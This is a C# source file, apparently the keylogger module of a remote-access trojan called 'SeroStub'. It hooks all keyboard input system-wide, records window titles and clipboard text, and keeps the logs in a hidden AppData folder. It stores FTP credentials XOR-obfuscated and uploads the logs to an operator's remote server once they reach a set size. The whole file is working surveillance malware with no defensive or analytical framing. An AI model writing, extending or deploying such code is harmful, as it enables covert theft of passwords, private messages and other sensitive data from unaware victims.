using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

namespace SeroStub;

internal static class KeyloggerFeature
{
    // ── WinAPI ─────────────────────────────────────────────────────────────
    [DllImport("user32.dll")] private static extern nint SetWindowsHookEx(int idHook, nint lpfn, nint hMod, uint dwThreadId);
    [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(nint hhk);
    [DllImport("user32.dll")] private static extern nint CallNextHookEx(nint hhk, int nCode, nint wParam, nint lParam);
    [DllImport("user32.dll")] private static extern nint GetForegroundWindow();
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] private static extern int GetWindowText(nint hWnd, StringBuilder sb, int cch);
    [DllImport("user32.dll")] private static extern int GetMessage(out MSG msg, nint hWnd, uint min, uint max);
    [DllImport("user32.dll")] private static extern bool TranslateMessage(ref MSG msg);
    [DllImport("user32.dll")] private static extern nint DispatchMessage(ref MSG msg);
    [DllImport("user32.dll")] private static extern bool PostThreadMessage(uint tid, uint msg, nint wp, nint lp);
    [DllImport("user32.dll")] private static extern bool GetKeyboardState(byte[] lpKeyState);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] private static extern int ToUnicodeEx(uint vk, uint sc, byte[] ks, StringBuilder buf, int sz, uint flags, nint hkl);
    [DllImport("user32.dll")] private static extern nint GetKeyboardLayout(uint idThread);
    [DllImport("user32.dll")] private static extern uint GetWindowThreadProcessId(nint hWnd, out uint lpdwProcessId);
    [DllImport("kernel32.dll")] private static extern uint GetCurrentThreadId();

    // ── Clipboard WinAPI ────────────────────────────────────────────────────
    [DllImport("user32.dll")] private static extern bool IsClipboardFormatAvailable(uint format);
    [DllImport("user32.dll")] private static extern bool OpenClipboard(nint hWndNewOwner);
    [DllImport("user32.dll")] private static extern bool CloseClipboard();
    [DllImport("user32.dll")] private static extern nint GetClipboardData(uint uFormat);
    [DllImport("kernel32.dll")] private static extern nint GlobalLock(nint hMem);
    [DllImport("kernel32.dll")] private static extern bool GlobalUnlock(nint hMem);

    private const uint CF_UNICODETEXT = 13;

    [StructLayout(LayoutKind.Sequential)]
    private struct MSG { public nint hwnd; public uint message; public nint wParam; public nint lParam; public uint time; public int x, y; }

    [StructLayout(LayoutKind.Sequential)]
    private struct KBDLLHOOKSTRUCT { public uint vkCode; public uint scanCode; public uint flags; public uint time; public nint dwExtraInfo; }

    private const int  WH_KEYBOARD_LL = 13;
    private const int  WM_KEYDOWN     = 0x0100;
    private const int  WM_SYSKEYDOWN  = 0x0104;
    private const uint WM_QUIT        = 0x0012;

    // ── Disk logging ────────────────────────────────────────────────────────
    private static readonly string _logDir =
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                     Config.PersistName, "kl");
    private static readonly string _ftpCfgPath = Path.Combine(_logDir, "ftp.dat");
    private static readonly byte[] _ftpXorKey  = { 0x4B, 0x37, 0xA9, 0x2C, 0x81, 0xF5, 0x6D, 0x1E,
                                                    0xC0, 0x58, 0x93, 0x2F, 0x74, 0xBA, 0x0D, 0x66 };

    private static string TodayFile =>
        Path.Combine(_logDir, DateTime.UtcNow.ToString("yyyy-MM-dd") + ".txt");

    // Flush in-memory buffer to disk every 30 seconds
    private static readonly System.Timers.Timer _flushTimer = new(30_000) { AutoReset = true };

    static KeyloggerFeature()
    {
        _flushTimer.Elapsed += (_, _) => FlushToDisk();
        _clipTimer.Elapsed  += (_, _) => PollClipboard();
        LoadFtpConfig();
    }

    private static void FlushToDisk()
    {
        string text;
        lock (_bufLock)
        {
            if (_buf.Length == 0) return;
            text = _buf.ToString();
            _buf.Clear();
        }
        try
        {
            Directory.CreateDirectory(_logDir);
            File.AppendAllText(TodayFile, text, Encoding.UTF8);
            CheckSizeThreshold();
        }
        catch { }
    }

    // ── State ───────────────────────────────────────────────────────────────
    private static nint          _hook;
    private static Thread?       _thread;
    private static volatile bool _running;
    private static uint          _threadId;
    private static readonly ManualResetEventSlim _threadReady = new(false);
    private static readonly StringBuilder _buf       = new();
    private static readonly object        _bufLock   = new();
    private static readonly object        _startLock = new();
    private static nint   _lastHwnd;
    private static string _lastTitle = string.Empty;
    private static readonly StringBuilder _titleSb = new(256);
    private static readonly byte[]        _kbState  = new byte[256];
    private static readonly StringBuilder _charSb   = new(8);

    // ── FTP / clipboard state ───────────────────────────────────────────────
    private static string?  _ftpHost;
    private static int      _ftpPort          = 21;
    private static string?  _ftpUser;
    private static string?  _ftpPass;
    private static string?  _ftpPath          = "/";
    private static int      _maxSizeKb;
    private static volatile bool _clipboardEnabled;
    private static int           _uploadFlag;   // 0=idle 1=in-progress; only via Interlocked
    private static string   _lastClip         = string.Empty;
    private static Func<string, string, string, int, Task>? _ftpStatusCb;
    private static readonly System.Timers.Timer _clipTimer = new(500) { AutoReset = true };
    // Set on disconnect-flush so the next connect auto-restarts the hook thread.
    // Cleared when operator explicitly stops via KeyloggerStop packet.
    private static volatile bool _restartOnConnect;

    // ── Public API ──────────────────────────────────────────────────────────

    internal static bool IsRunning        => _running;
    internal static bool IsFtpConfigured  => !string.IsNullOrEmpty(_ftpHost);
    internal static bool RestartOnConnect => _restartOnConnect;
    internal static void ClearRestartOnConnect() => _restartOnConnect = false;

    internal static void RefreshFtpCallback(Func<string, string, string, int, Task> cb)
    {
        if (IsFtpConfigured) _ftpStatusCb = cb;
    }

    internal static void Start()
    {
        lock (_startLock) { if (_running) return; _running = true; }
        _threadReady.Reset();
        _flushTimer.Start();
        if (_clipboardEnabled) _clipTimer.Start();
        _thread = new Thread(HookThread) { IsBackground = true, Name = "KL" };
        _thread.Start();
    }

    internal static void Stop(bool reconnecting = false)
    {
        lock (_startLock)
        {
            _restartOnConnect = reconnecting && _running;
            if (!_running) return;
            _running = false;
        }
        _flushTimer.Stop();
        _clipTimer.Stop();
        FlushToDisk();
        // Wait until HookThread has set _threadId before sending WM_QUIT.
        // Without this, Stop() racing with Start() would PostThreadMessage(0,...) = no-op.
        _threadReady.Wait(500);
        if (_threadId != 0) PostThreadMessage(_threadId, WM_QUIT, 0, 0);
        _thread?.Join(3000);
        _thread = null;
        _threadId = 0;
    }

    internal static string GetAndClearLogs()
    {
        string text;
        lock (_bufLock)
        {
            text = _buf.ToString();
            _buf.Clear();
        }
        // Also persist to disk so the daily log file stays complete
        if (text.Length > 0)
        {
            try
            {
                Directory.CreateDirectory(_logDir);
                File.AppendAllText(TodayFile, text, Encoding.UTF8);
                CheckSizeThreshold();
            }
            catch { }
        }
        return text;
    }

    // ── File management ─────────────────────────────────────────────────────

    internal static KeyloggerFileInfo[] GetLogFiles()
    {
        try
        {
            if (!Directory.Exists(_logDir)) return [];
            return Directory.GetFiles(_logDir, "*.txt")
                .Select(f => new KeyloggerFileInfo { Filename = Path.GetFileName(f), Size = new FileInfo(f).Length })
                .OrderByDescending(x => x.Filename)
                .ToArray();
        }
        catch { return []; }
    }

    internal static string GetFileContent(string filename)
    {
        try
        {
            var safe = Path.GetFileName(filename);
            var path = Path.Combine(_logDir, safe);
            if (!File.Exists(path)) return "";
            return File.ReadAllText(path, Encoding.UTF8);
        }
        catch { return ""; }
    }

    internal static void DeleteFile(string filename)
    {
        try
        {
            var safe = Path.GetFileName(filename);
            File.Delete(Path.Combine(_logDir, safe));
        }
        catch { }
    }

    // ── FTP + clipboard API ─────────────────────────────────────────────────

    internal static void SetFtpConfig(
        string host, int port, string user, string pass,
        string path, int maxSizeKb, bool clipboardEnabled,
        Func<string, string, string, int, Task> statusCb)
    {
        _ftpHost          = host;
        _ftpPort          = port;
        _ftpUser          = user;
        _ftpPass          = pass;
        _ftpPath          = string.IsNullOrEmpty(path) ? "/" : path;
        _maxSizeKb        = maxSizeKb;
        _ftpStatusCb      = statusCb;
        _clipboardEnabled = clipboardEnabled;

        if (clipboardEnabled && _running)
            _clipTimer.Start();
        else
            _clipTimer.Stop();

        SaveFtpConfig();
    }

    private static void SaveFtpConfig()
    {
        try
        {
            var cfg = new KeyloggerFtpConfigStub
            {
                FtpHost          = _ftpHost ?? "",
                FtpPort          = _ftpPort,
                FtpUser          = _ftpUser ?? "",
                FtpPass          = _ftpPass ?? "",
                FtpPath          = _ftpPath ?? "/",
                MaxSizeKb        = _maxSizeKb,
                ClipboardEnabled = _clipboardEnabled
            };
            var json  = System.Text.Json.JsonSerializer.Serialize(cfg, SeroJson.Default.KeyloggerFtpConfigStub);
            var bytes = Encoding.UTF8.GetBytes(json);
            for (int i = 0; i < bytes.Length; i++) bytes[i] ^= _ftpXorKey[i % _ftpXorKey.Length];
            Directory.CreateDirectory(_logDir);
            File.WriteAllBytes(_ftpCfgPath, bytes);
        }
        catch { }
    }

    private static void LoadFtpConfig()
    {
        try
        {
            if (!File.Exists(_ftpCfgPath)) return;
            var bytes = File.ReadAllBytes(_ftpCfgPath);
            for (int i = 0; i < bytes.Length; i++) bytes[i] ^= _ftpXorKey[i % _ftpXorKey.Length];
            var cfg = System.Text.Json.JsonSerializer.Deserialize(
                Encoding.UTF8.GetString(bytes), SeroJson.Default.KeyloggerFtpConfigStub);
            if (cfg == null || string.IsNullOrEmpty(cfg.FtpHost)) return;
            _ftpHost          = cfg.FtpHost;
            _ftpPort          = cfg.FtpPort;
            _ftpUser          = cfg.FtpUser;
            _ftpPass          = cfg.FtpPass;
            _ftpPath          = string.IsNullOrEmpty(cfg.FtpPath) ? "/" : cfg.FtpPath;
            _maxSizeKb        = cfg.MaxSizeKb;
            _clipboardEnabled = cfg.ClipboardEnabled;
        }
        catch { }
    }

    private static void PollClipboard()
    {
        if (!_clipboardEnabled) return;
        if (!IsClipboardFormatAvailable(CF_UNICODETEXT)) return;
        if (!OpenClipboard(nint.Zero)) return;
        try
        {
            var hData = GetClipboardData(CF_UNICODETEXT);
            if (hData == nint.Zero) return;
            var ptr = GlobalLock(hData);
            if (ptr == nint.Zero) return;
            try
            {
                var text = Marshal.PtrToStringUni(ptr) ?? "";
                if (text.Length == 0 || text == _lastClip) return;
                _lastClip = text;
                var entry = $"\r\n[CLIPBOARD — {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss} UTC]\r\n{text}\r\n";
                lock (_bufLock) { _buf.Append(entry); }
            }
            finally { GlobalUnlock(hData); }
        }
        catch { }
        finally { CloseClipboard(); }
    }

    private static void CheckSizeThreshold()
    {
        if (_maxSizeKb <= 0 || string.IsNullOrEmpty(_ftpHost) || _uploadFlag != 0) return;
        try
        {
            var today = TodayFile;
            if (!File.Exists(today)) return;
            if (new FileInfo(today).Length / 1024 >= _maxSizeKb)
                _ = Task.Run(RotateAndUploadAsync);
        }
        catch { }
    }

    private static string? RotateLog()
    {
        var today = TodayFile;
        if (!File.Exists(today)) return null;
        var rotated = Path.Combine(_logDir, DateTime.UtcNow.ToString("yyyy-MM-dd_HHmmss") + ".txt");
        try { File.Move(today, rotated); return rotated; } catch { return null; }
    }

    private static async Task RotateAndUploadAsync()
    {
        if (Interlocked.CompareExchange(ref _uploadFlag, 1, 0) != 0) return;
        try
        {
            var rotated = RotateLog();
            if (rotated == null) return;
            var filename = Path.GetFileName(rotated);
            var cb = _ftpStatusCb;
            for (int attempt = 1; attempt <= 3; attempt++)
            {
                if (cb != null) try { await cb("uploading", filename, "", attempt); } catch { }
                try
                {
                    await FtpUploadAsync(rotated, _ftpHost!, _ftpPort, _ftpUser ?? "", _ftpPass ?? "", _ftpPath ?? "/");
                    if (cb != null) try { await cb("uploaded", filename, "", attempt); } catch { }
                    return;
                }
                catch (Exception ex)
                {
                    if (attempt < 3)
                    {
                        if (cb != null) try { await cb("retry", filename, ex.Message, attempt); } catch { }
                        await Task.Delay(5000);
                    }
                    else
                    {
                        if (cb != null) try { await cb("failed", filename, ex.Message, attempt); } catch { }
                    }
                }
            }
        }
        finally { Interlocked.Exchange(ref _uploadFlag, 0); }
    }

    private static async Task FtpUploadAsync(string localPath, string host, int port, string user, string pass, string remotePath)
    {
        user       = user.Replace("\r", "").Replace("\n", "");
        pass       = pass.Replace("\r", "").Replace("\n", "");
        remotePath = remotePath.Replace("\r", "").Replace("\n", "");
        using var ctrl = new TcpClient();
        await ctrl.ConnectAsync(host, port).WaitAsync(TimeSpan.FromSeconds(15));
        var ns = ctrl.GetStream();
        using var reader = new StreamReader(ns, Encoding.ASCII, leaveOpen: true);
        using var writer = new StreamWriter(ns, Encoding.ASCII, leaveOpen: true) { AutoFlush = true };

        await ReadFtpResponseAsync(reader);               // banner

        await writer.WriteLineAsync($"USER {user}");
        await ReadFtpResponseAsync(reader);
        await writer.WriteLineAsync($"PASS {pass}");
        var loginResp = await ReadFtpResponseAsync(reader);
        if (!loginResp.StartsWith("2") && !loginResp.StartsWith("3"))
            throw new Exception($"Login failed: {loginResp}");

        await writer.WriteLineAsync("TYPE I");
        await ReadFtpResponseAsync(reader);

        await writer.WriteLineAsync("PASV");
        var pasvResp = await ReadFtpResponseAsync(reader);
        var (dataHost, dataPort) = ParsePasv(pasvResp);

        using var dataConn = new TcpClient();
        await dataConn.ConnectAsync(dataHost, dataPort).WaitAsync(TimeSpan.FromSeconds(15));
        using var dataStream = dataConn.GetStream();

        // CWD then STOR filename (works with most servers)
        var dir = remotePath.TrimEnd('/');
        if (string.IsNullOrEmpty(dir)) dir = "/";
        await writer.WriteLineAsync($"CWD {dir}");
        await ReadFtpResponseAsync(reader);  // ignore CWD failure

        var filename = Path.GetFileName(localPath);
        await writer.WriteLineAsync($"STOR {filename}");
        var storResp = await ReadFtpResponseAsync(reader);
        if (!storResp.StartsWith("1"))
            throw new Exception($"STOR rejected: {storResp}");

        var bytes = await File.ReadAllBytesAsync(localPath);
        await dataStream.WriteAsync(bytes);
        dataStream.Close();
        dataConn.Close();

        var doneResp = await ReadFtpResponseAsync(reader);
        if (!doneResp.StartsWith("2"))
            throw new Exception($"Transfer incomplete: {doneResp}");

        await writer.WriteLineAsync("QUIT");
        try { await ReadFtpResponseAsync(reader); } catch { }
    }

    private static async Task<string> ReadFtpResponseAsync(StreamReader reader)
    {
        string last = "";
        string? line;
        while ((line = await reader.ReadLineAsync().WaitAsync(TimeSpan.FromSeconds(10))) != null)
        {
            last = line;
            // FTP multi-line: "xxx-..." continues; "xxx " terminates
            if (line.Length >= 4 && line[3] == ' ') break;
            if (line.Length < 4) break;
        }
        return last;
    }

    private static (string host, int port) ParsePasv(string resp)
    {
        var s = resp.IndexOf('(');
        var e = resp.IndexOf(')');
        if (s < 0 || e < 0) throw new Exception("Invalid PASV");
        var p = resp[(s + 1)..e].Split(',');
        if (p.Length < 6) throw new Exception("Invalid PASV parts");
        var host = $"{p[0]}.{p[1]}.{p[2]}.{p[3]}";
        var port = (int.Parse(p[4]) << 8) + int.Parse(p[5]);
        return (host, port);
    }

    // ── Hook thread ─────────────────────────────────────────────────────────

    private static unsafe void HookThread()
    {
        _threadId = GetCurrentThreadId();
        _threadReady.Set();
        var fp = (delegate* unmanaged<int, nint, nint, nint>)&HookProc;
        _hook = SetWindowsHookEx(WH_KEYBOARD_LL, (nint)fp, nint.Zero, 0);

        if (_hook == nint.Zero) { _running = false; return; }

        while (_running && GetMessage(out var msg, nint.Zero, 0, 0) > 0)
        {
            if (msg.message == WM_QUIT) break;
            TranslateMessage(ref msg);
            DispatchMessage(ref msg);
        }

        UnhookWindowsHookEx(_hook);
        _hook = nint.Zero;
    }

    [UnmanagedCallersOnly]
    private static nint HookProc(int nCode, nint wParam, nint lParam)
    {
        if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
            try { ProcessKey(lParam); } catch { }
        return CallNextHookEx(_hook, nCode, wParam, lParam);
    }

    private static void ProcessKey(nint lParam)
    {
        var khs = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
        uint vk = khs.vkCode;
        uint sc = khs.scanCode;

        if (vk is 0xA0 or 0xA1 or 0xA2 or 0xA3 or 0xA4 or 0xA5
                or 0x5B or 0x5C or 0x10 or 0x11 or 0x12) return;

        var hwnd = GetForegroundWindow();
        if (hwnd != _lastHwnd)
        {
            _lastHwnd = hwnd;
            _titleSb.Clear();
            GetWindowText(hwnd, _titleSb, 256);
            string title = _titleSb.ToString();
            if (title != _lastTitle && !string.IsNullOrEmpty(title))
            {
                _lastTitle = title;
                lock (_bufLock)
                {
                    if (_buf.Length > 0) _buf.AppendLine();
                    _buf.AppendLine($"\r\n[ {title} — {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss} UTC ]");
                }
            }
        }

        // Resolve the keyboard layout of the foreground window's thread so non-Latin
        // layouts (Arabic, Russian, Greek, CJK, etc.) translate correctly.
        // ToUnicode uses the calling thread's layout; ToUnicodeEx accepts an explicit handle.
        uint threadId = GetWindowThreadProcessId(hwnd, out _);
        nint hkl = GetKeyboardLayout(threadId);

        Array.Clear(_kbState, 0, 256);
        GetKeyboardState(_kbState);
        _charSb.Clear();
        // Flag 4 = don't modify the dead-key state — avoids breaking ^+a→â composition in the target app
        int n = ToUnicodeEx(vk, sc, _kbState, _charSb, 8, 4, hkl);
        string chars = n > 0 ? _charSb.ToString(0, n) : (_charSb.Length > 0 ? _charSb.ToString(0, 1) : "");

        lock (_bufLock)
        {
            if (n > 0 && chars.Length > 0 && !char.IsControl(chars[0]))
                _buf.Append(chars);
            else if (n < 0)
            {
                // Dead key pressed (^, ¨, ~, …) — log it as-is so the log is readable
                if (chars.Length > 0) _buf.Append(chars[0]);
            }
            else
            {
                string? special = VkToLabel(vk);
                if (special != null) _buf.Append(special);
            }

            // Keep buffer bounded — flush to disk before it overflows
            if (_buf.Length > 256 * 1024)
            {
                var text = _buf.ToString();
                _buf.Clear();
                Task.Run(() =>
                {
                    try
                    {
                        Directory.CreateDirectory(_logDir);
                        File.AppendAllText(TodayFile, text, Encoding.UTF8);
                        CheckSizeThreshold();
                    }
                    catch { }
                });
            }
        }
    }

    private static string? VkToLabel(uint vk) => vk switch
    {
        0x08 => "[Back]", 0x09 => "[Tab]", 0x0D => "\n[Enter]\n",
        0x1B => "[Esc]",  0x20 => " ",     0x2E => "[Del]", 0x2D => "[Ins]",
        0x21 => "[PgUp]", 0x22 => "[PgDn]", 0x23 => "[End]", 0x24 => "[Home]",
        0x25 => "[←]",    0x26 => "[↑]",    0x27 => "[→]",   0x28 => "[↓]",
        0x70 => "[F1]",  0x71 => "[F2]",  0x72 => "[F3]",  0x73 => "[F4]",
        0x74 => "[F5]",  0x75 => "[F6]",  0x76 => "[F7]",  0x77 => "[F8]",
        0x78 => "[F9]",  0x79 => "[F10]", 0x7A => "[F11]", 0x7B => "[F12]",
        0x14 => "[Caps]", 0x90 => "[NumLk]",
        _ => null
    };
}

// ── Data types ────────────────────────────────────────────────────────────────
internal class KeyloggerLogsResultStub  { public string Logs { get; set; } = ""; public bool IsRunning { get; set; } }
internal class KeyloggerFileInfo        { public string Filename { get; set; } = ""; public long Size { get; set; } }
internal class KeyloggerFilesResultStub { public List<KeyloggerFileInfo> Files { get; set; } = []; public bool IsRunning { get; set; } }
internal class KeyloggerGetFileStub     { public string Filename { get; set; } = ""; }
internal class KeyloggerFileContentStub { public string Filename { get; set; } = ""; public string Content { get; set; } = ""; }
internal class KeyloggerFtpConfigStub
{
    public string FtpHost          { get; set; } = "";
    public int    FtpPort          { get; set; } = 21;
    public string FtpUser          { get; set; } = "";
    public string FtpPass          { get; set; } = "";
    public string FtpPath          { get; set; } = "/";
    public int    MaxSizeKb        { get; set; } = 500;
    public bool   ClipboardEnabled { get; set; } = true;
}
internal class KeyloggerFtpStatusStub
{
    public string Event    { get; set; } = "";
    public string Filename { get; set; } = "";
    public string Message  { get; set; } = "";
    public int    Attempt  { get; set; }
}
